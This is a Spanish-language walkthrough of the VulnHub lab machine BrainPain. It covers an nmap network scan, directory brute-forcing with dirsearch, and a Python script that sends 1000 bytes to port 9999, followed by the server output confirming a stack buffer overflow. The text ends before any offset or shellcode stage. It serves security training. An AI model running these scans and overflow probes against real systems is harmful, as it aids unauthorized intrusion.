# Resolviendo máquina BrainPain de VulnHub
---
### Software:

- Immunity Debugger
- mona.py
- VMware
- Dirsearch
- python

### OS:

 - Windows 10 Pro
 - Kali Linux
 - MV BrainPain
 ---
 ### Empezamos:
 En primer lugar, levantaremos la máquina BrainPain y desde nuestra Kali haremos un escaneo de nuestra red para ver si la encontramos. Para ello lanzamos:
 ````
 nmap 192.168.0.0/24 -v -O
 ````
 Una vez la identificamos nos damos cuenta que tiene abiertos los puertos 9999 y el 10000 con el servicio HTTP activo, por lo que abriremos la dirección en el navegador web.
 
##### Instalación y uso de "Dirsearch"
 Al entrar en la dirección web encontramos una imagen y no hay enlaces ni posibilidad de movernos por la web, por lo que utilizaremos el siguiente programa: ***Dirsearch***
 ````
 https://github.com/maurosoria/dirsearch
 git clone https://github.com/maurosoria/dirsearch.git
 cd dirsearch
 python3 dirsearch.py -u <URL> -e <EXTENSIONS>
 ````
 Al ejecutar el programa, econtramos que tiene un directorio: "/bin". Al entrar nos encontramos con un .exe.
 Por lo que llega el momento de irnos a nuestra máquina Windows 10 pro.

Al ejecutar el programa nos encontramos con esto:
 ````
 [+] initializing winsock...done.
 [+] server socket created.
 [+] bind done on port 9999
 [+] waiting for connections.
 
 ````

Se crea un server socket en el puerto 9999. Es el momento de crear un script en python para ser capaces de enviarles bytes al servidor y ver si somos capaces de encontrar un BOF.

##### Creacion del script

El script nombrado "brainpain.py" es muy sencillo, simplemente genera una conexión y manda los bytes que le indiquemos:
````
#!/usr/bin/python
import socket

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(('xxx.xxx.xxx.xxx',9999))

buf = '\x41' * 1000

client.send(buf)
data = client.recv(len(buf))
client.close()
print data

````

#### Explotación del BoF
Al ejecutar el script le hemos enviado 1000 bytes al socket, la respuesta que recibimos nos deja caer que hemos sobreescrito la pila y por tanto hemos encontrado un BoF:
````
[+] received connection.
[get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA( _]
[get_reply] copied 1003 bytes to buffer
````


